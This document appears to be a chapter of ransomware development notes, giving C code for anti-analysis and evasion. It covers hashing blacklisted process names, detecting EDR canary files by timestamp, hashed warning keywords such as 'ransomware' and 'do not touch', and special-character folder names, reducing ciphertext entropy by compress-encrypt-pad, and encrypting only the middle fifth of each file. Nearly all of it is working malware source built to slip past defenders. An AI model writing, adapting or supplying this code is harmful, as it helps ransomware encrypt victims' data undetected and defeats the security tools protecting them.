# 07 — Anti-Analysis & Evasion

## Process Blacklist via CRC32B Hashes (no plaintext strings in binary)
```c
#include <tlhelp32.h>

BOOL CheckBlacklistedProcesses(const DWORD hashes[], DWORD dwCount) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };
    if (!Process32FirstW(hSnap, &pe)) { CloseHandle(hSnap); return FALSE; }

    BOOL bFound = FALSE;
    do {
        DWORD h = Crc32bW(pe.szExeFile, TRUE);
        for (DWORD i = 0; i < dwCount; i++) {
            if (h == hashes[i]) { bFound = TRUE; break; }
        }
        if (bFound) break;
    } while (Process32NextW(hSnap, &pe));

    CloseHandle(hSnap);
    return bFound;
}
```

---

## Tripwire / Canary File Detection

### Method 1: Timestamp staleness (untouched > 120 days = likely decoy)
```c
#define TRIPWIRE_DAYS 120
#define NS_TO_DAYS(x) ((x) / (10000ULL * 1000 * 60 * 60 * 24))

BOOL IsFileTripwire_Timestamp(LPCWSTR szPath) {
    HANDLE hFile = CreateFileW(szPath, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    FILETIME ftCreate, ftWrite, ftNow;
    GetFileTime(hFile, &ftCreate, NULL, &ftWrite);
    CloseHandle(hFile);
    GetSystemTimeAsFileTime(&ftNow);

    ULARGE_INTEGER uNow  = { ftNow.dwLowDateTime, ftNow.dwHighDateTime };
    ULARGE_INTEGER uWrite = { ftWrite.dwLowDateTime, ftWrite.dwHighDateTime };
    ULARGE_INTEGER uCreate = { ftCreate.dwLowDateTime, ftCreate.dwHighDateTime };

    if (uCreate.QuadPart == uWrite.QuadPart) return TRUE;

    if (uNow.QuadPart > uWrite.QuadPart && NS_TO_DAYS(uNow.QuadPart - uWrite.QuadPart) > TRIPWIRE_DAYS)
        return TRUE;

    return FALSE;
}
```

### Method 2: FNV-1a keyword detection in directory/file names
```c
#define FNV_DO_NOT     0x3A8CFDBD
#define FNV_DONOT      0x5A3A8945
#define FNV_DONT       0x35F3980E
#define FNV_TOUCH      0x698989D8
#define FNV_RANSOMWARE 0x20FCA652
#define FNV_RANSOM     0x886BD747
#define FNV_NEVER      0x0AC95089
#define FNV_EDIT       0x5BE7D591
#define FNV_CHANGE     0x729D01BD
#define FNV_ALTER      0x22CE6F6B
#define FNV_FILELOCKER 0xA246067B

__forceinline DWORD Fnv1aW(LPCWSTR sz, DWORD dwLen) {
    DWORD h = 0x811C9DC5;
    for (DWORD i = 0; i < dwLen; i++) { h ^= (DWORD)sz[i]; h *= 0x01000193; }
    return h;
}

__forceinline BOOL IsWordBoundary(WCHAR ch) {
    return (ch == L' ' || ch == L'-' || ch == L'_' || ch == L'.' || ch == L'/' || ch == L'\\');
}

BOOL ContainsWarningPattern(LPCWSTR szName) {
    WCHAR szLower[512]; DWORD dwLen = lstrlenW(szName);
    if (dwLen >= 512) return FALSE;
    wcscpy_s(szLower, 512, szName);
    CharLowerBuffW(szLower, dwLen);

    DWORD start = 0;
    for (DWORD i = 0; i <= dwLen; i++) {
        if (i == dwLen || IsWordBoundary(szLower[i])) {
            DWORD tokenLen = i - start;
            if (tokenLen >= 4 && tokenLen <= 12) {
                DWORD h = Fnv1aW(&szLower[start], tokenLen);
                if (h == FNV_RANSOMWARE || h == FNV_RANSOM || h == FNV_FILELOCKER ||
                    h == FNV_DONT || h == FNV_NEVER || h == FNV_TOUCH) return TRUE;
            }
            start = i + 1;
        }
    }
    return FALSE;
}
```

### Method 3: Directory starts with special character (EDR plants these)
```c
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL DirStartsWithSpecialChar(LPCWSTR szDir) {
    return (StrChrW(L"!@#$%^&()-_=+[]{};\',`.~ ", szDir[0]) != NULL);
}
```

### Method 4: Hidden file/directory skip
```c
BOOL IsHidden(LPCWSTR szPath) {
    DWORD attr = GetFileAttributesW(szPath);
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_HIDDEN));
}
```

---

## Entropy Reduction (stealth encryption)
```c
#include <ntifs.h>

BOOL CompressAndEncrypt(PBYTE pPlain, DWORD dwSize, PBYTE pKey, PBYTE pIv,
    PBYTE* ppOut, PDWORD pdwOutSize, PDWORD pdwPaddingOffset) {

    PBYTE pComp = (PBYTE)LocalAlloc(LPTR, dwSize);
    PBYTE pWork = (PBYTE)LocalAlloc(LPTR, dwSize);
    ULONG ulCompSize = 0;
    RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, pPlain, dwSize,
        pComp, dwSize, 4096, &ulCompSize, pWork);
    LocalFree(pWork);

    PBYTE pEnc = NULL; DWORD dwEncSize = 0;
    Aes256CbcEncrypt(pComp, ulCompSize, pKey, pIv, &pEnc, &dwEncSize);
    LocalFree(pComp);

    BYTE bFreq = 0; DWORD maxCount = 0;
    DWORD counts[256] = { 0 };
    for (DWORD i = 0; i < dwEncSize; i++) counts[pEnc[i]]++;
    for (int i = 0; i < 256; i++) if (counts[i] > maxCount) { maxCount = counts[i]; bFreq = (BYTE)i; }

    PBYTE pPadded = (PBYTE)LocalAlloc(LPTR, dwSize);
    memcpy(pPadded, pEnc, dwEncSize);
    memset(pPadded + dwEncSize, bFreq, dwSize - dwEncSize);
    LocalFree(pEnc);

    *ppOut = pPadded;
    *pdwOutSize = dwSize;
    *pdwPaddingOffset = dwEncSize;
    return TRUE;
}
```

## Middle-20% Encryption (header stays intact, avoids magic byte corruption)
```c
#define MAX_20PCT_READ (32 * 1024 * 1024)

void CalcMiddle20(DWORDLONG ullFileSize, DWORDLONG* pOffset, DWORD* pSize) {
    DWORDLONG ull20 = ullFileSize / 5;
    if (ull20 > MAX_20PCT_READ) ull20 = MAX_20PCT_READ;
    if (ull20 < 4096) ull20 = min(ullFileSize, 4096);
    *pOffset = ullFileSize / 2;
    *pSize = (DWORD)ull20;
}
```
